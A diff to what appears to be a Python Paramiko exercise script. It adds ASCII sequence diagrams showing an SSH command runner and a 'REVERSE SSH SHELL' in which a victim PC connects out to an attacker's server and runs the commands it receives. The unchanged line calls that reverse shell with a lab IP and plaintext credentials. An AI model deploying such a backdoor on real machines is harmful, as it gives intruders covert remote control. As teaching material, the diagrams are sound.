@@ -43,3 +43,53 @@ ssh_command_reverse('192.168.121.138','justin','mypassword','ClientConnected')
 
 
 
+# ┌────────────┐       ┌────────────┐       ┌──────────────┐
+# │  Operator  │       │   Paramiko │       │ Remote Server│
+# └────┬───────┘       └────┬───────┘       └──────┬────────┘
+#      │ Call ssh_command() │                    │
+#      │───────────────────▶│                    │
+#      │                    │ SSHClient.connect()│
+#      │                    │───────────────────▶│
+#      │                    │ Open session       │
+#      │                    │───────────────────▶│
+#      │                    │ Exec command 'id'  │
+#      │                    │───────────────────▶│
+#      │                    │ Read output        │
+#      │                    │◀───────────────────│
+#      │                    │ Print response     │
+#      │◀───────────────────│                    │
+
+
+
+
+
+
+
+
+
+#REVERSE SSH SHELL 
+
+
+# ┌────────────┐       ┌────────────┐       ┌──────────────┐
+# │  Victim PC │       │   Paramiko │       │ Attacker SSH │
+# └────┬───────┘       └────┬───────┘       └──────┬────────┘
+#      │ ssh_command_reverse() │                 │
+#      │──────────────────────▶│                 │
+#      │                       │ Connect via SSH │
+#      │                       │────────────────▶│
+#      │                       │ Open session    │
+#      │                       │────────────────▶│
+#      │                       │ Send "ClientConnected"
+#      │                       │────────────────▶│
+#      │                       │ Wait for command
+#      │                       │◀────────────────│
+#      │                       │ Execute command │
+#      │     subprocess.check_output(command)    │
+#      │                       │ Send output     │
+#      │                       │────────────────▶│
+#      │                       │ Loop continues  │
+#      │                       │ Until "exit"    │
+#      │                       │◀────────────────│
+#      │                       │ Close session   │
+#      │                       │────────────────▶│
+
